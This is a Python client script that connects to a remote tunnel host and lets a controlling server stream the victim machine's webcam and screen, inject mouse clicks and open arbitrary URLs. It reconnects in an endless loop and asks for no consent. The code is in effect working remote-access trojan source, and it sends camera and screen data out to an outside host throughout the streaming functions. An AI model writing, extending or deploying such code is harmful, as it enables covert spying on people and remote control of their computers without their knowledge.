import socket
import cv2
import struct
import time
import threading
import webbrowser
from PIL import ImageGrab, Image  # For screen capture
import numpy as np
import pyautogui

# Message type constants
MSG_TYPE_VIDEO = 1
MSG_TYPE_COMMAND = 2
MSG_TYPE_SCREEN = 3

server_ip = "pressure-madrid.gl.at.ply.gg"  # Replace with your server's IP if needed
port = 3113

# Transmission control flags (toggled via commands from the server)
send_video = False
send_screen = False

def recvall(sock, count):
    """Receive exactly 'count' bytes from the socket."""
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def connect_and_handshake():
    """
    Continuously attempts to connect to the server and perform a handshake.
    Returns the connected socket once the handshake is successful.
    """
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, port))
            handshake_msg = "HELLO_SERVER"
            sock.sendall(handshake_msg.encode('utf-8'))
            response = sock.recv(1024)
            if response.decode('utf-8').strip() == "WELCOME":
                print("Handshake completed with server.")
                return sock
            else:
                sock.close()
                time.sleep(5)
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(5)

def command_listener(sock, connection_lost):
    """
    Listens for command messages from the server to control
    video and screen transmission or to open URLs.
    """
    global send_video, send_screen
    header_size = 5  # 1 byte for type, 4 bytes for payload length
    while not connection_lost.is_set():
        try:
            header = recvall(sock, header_size)
            if not header:
                print("Command connection closed.")
                connection_lost.set()
                break
            msg_type, payload_size = struct.unpack("!BI", header)
            payload = recvall(sock, payload_size)
            if payload is None:
                print("Incomplete command payload.")
                connection_lost.set()
                break
            if msg_type == MSG_TYPE_COMMAND:
                cmd = payload.decode('utf-8')
                if cmd == "VIDEO_OFF":
                    send_video = False
                    print("Received VIDEO_OFF command, turning off camera transmission.")
                elif cmd == "VIDEO_ON":
                    send_video = True
                    print("Received VIDEO_ON command, resuming camera transmission.")
                elif cmd == "SCREEN_OFF":
                    send_screen = False
                    print("Received SCREEN_OFF command, stopping screen transmission.")
                elif cmd == "SCREEN_ON":
                    send_screen = True
                    print("Received SCREEN_ON command, resuming screen transmission.")
                elif cmd.startswith("CLICK:"):
                    try:
                        _, x_str, y_str = cmd.split(":")
                        x = int(x_str)
                        y = int(y_str)
                        original_pos = pyautogui.position()
                        pyautogui.moveTo(x, y)
                        pyautogui.click()
                        pyautogui.moveTo(original_pos[0], original_pos[1])
                        print(f"Simulated click at: ({x}, {y}) and returned to original position: {original_pos}")
                    except Exception as e:
                        print("Error processing click command:", e)
                else:
                    print("Received URL command:", cmd)
                    webbrowser.open(cmd)
            else:
                print("Received unexpected message type in command listener:", msg_type)
        except Exception as e:
            print("Error in command listener:", e)
            connection_lost.set()
            break
    sock.close()

def video_stream_send(sock, send_lock, connection_lost):
    """
    Captures video frames from the camera and sends them to the server.
    If send_video is False, the camera is released.
    """
    global send_video
    cap = None
    try:
        while not connection_lost.is_set():
            if send_video:
                if cap is None:
                    cap = cv2.VideoCapture(0)
                    if not cap.isOpened():
                        print("Camera not accessible.")
                        time.sleep(1)
                        continue
                ret, frame = cap.read()
                if not ret:
                    continue

                ret, buffer = cv2.imencode('.jpg', frame)
                if not ret:
                    continue
                data = buffer.tobytes()
                header = struct.pack("!BI", MSG_TYPE_VIDEO, len(data))
                message = header + data

                try:
                    with send_lock:
                        sock.sendall(message)
                except Exception as e:
                    print("Video stream send error:", e)
                    connection_lost.set()
                    break
            else:
                if cap is not None:
                    cap.release()
                    cap = None
            if cv2.waitKey(1) == ord('q'):
                connection_lost.set()
                break
            time.sleep(0.05)
    except Exception as e:
        print("Video stream encountered error:", e)
    finally:
        if cap is not None:
            cap.release()
        cv2.destroyAllWindows()

def screen_stream_send(sock, send_lock, connection_lost):
    """
    Captures the screen and sends frames to the server.
    """
    global send_screen
    try:
        while not connection_lost.is_set():
            if not send_screen:
                time.sleep(0.1)
                continue

            screen = ImageGrab.grab()
            screen_np = np.array(screen)
            frame = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)

            ret, buffer = cv2.imencode('.jpg', frame)
            if not ret:
                continue
            data = buffer.tobytes()
            header = struct.pack("!BI", MSG_TYPE_SCREEN, len(data))
            message = header + data

            try:
                with send_lock:
                    sock.sendall(message)
            except Exception as e:
                print("Screen stream send error:", e)
                connection_lost.set()
                break

            time.sleep(0.1)  # Adjust this delay to control the screen frame rate
    except Exception as e:
        print("Screen stream encountered error:", e)

def start_streaming():
    """
    Connects to the server, starts all streaming and command threads,
    and monitors the connection. If any thread signals a connection loss,
    the function exits, allowing the outer loop to reconnect.
    """
    sock = connect_and_handshake()
    send_lock = threading.Lock()
    connection_lost = threading.Event()

    listener_thread = threading.Thread(target=command_listener, args=(sock, connection_lost), daemon=True)
    video_thread = threading.Thread(target=video_stream_send, args=(sock, send_lock, connection_lost), daemon=True)
    screen_thread = threading.Thread(target=screen_stream_send, args=(sock, send_lock, connection_lost), daemon=True)

    listener_thread.start()
    video_thread.start()
    screen_thread.start()

    # Keep the main thread alive until a connection loss is detected.
    while not connection_lost.is_set():
        time.sleep(1)

    print("Connection lost. Reconnecting...")
    sock.close()

if __name__ == '__main__':
    while True:
        try:
            start_streaming()
        except Exception as e:
            print("Unexpected error, reconnecting...", e)
        time.sleep(5)
